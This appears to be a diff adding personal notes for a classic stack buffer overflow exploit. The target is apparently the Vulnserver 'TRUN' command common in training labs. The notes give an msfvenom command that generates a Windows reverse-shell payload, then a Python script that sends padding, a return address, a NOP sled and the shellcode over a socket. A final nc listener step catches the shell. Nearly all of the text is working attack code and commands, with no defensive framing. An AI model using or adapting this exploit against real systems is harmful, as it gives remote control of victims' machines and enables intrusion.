@@ -1,0 +1,36 @@
+##################################
+#####BUFFER###############
+#############OVER-FLOW#####################
+######ROOT ACCESS#################
+
+1)Generate rever shell code In Kali:
+    ->msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+        -p == payloads
+        LHOST == Our Kali
+        LPORT == Listenning Port
+
+2)Get the GENERATED VALUE by msfvenom and past it on our script by using a List:
+#!/usr/bin/python
+import sys
+import socket
+
+msfvenomOverflow = (GENERATED VALUE)
+
+#the Value of the HEXA RETURN ADDRESS above will be REVERSED and add nobs + the reverse shell code list
+shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + msfvenomOverflow
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port)) #CouldBe HARDCODED...
+    s.send(('TRUN /.:/' + shellcode))
+    s.close()
+    
+except Exception as e:
+    print(e)
+    print ("Error connecting to server")
+    sys.exit()
+
+3)Open another Terminal and Kali to listen the revershell execution:
+    ->nc -nvlp 4444
+
+4)Start up the script ans check on the other terminal if we got a Revershell
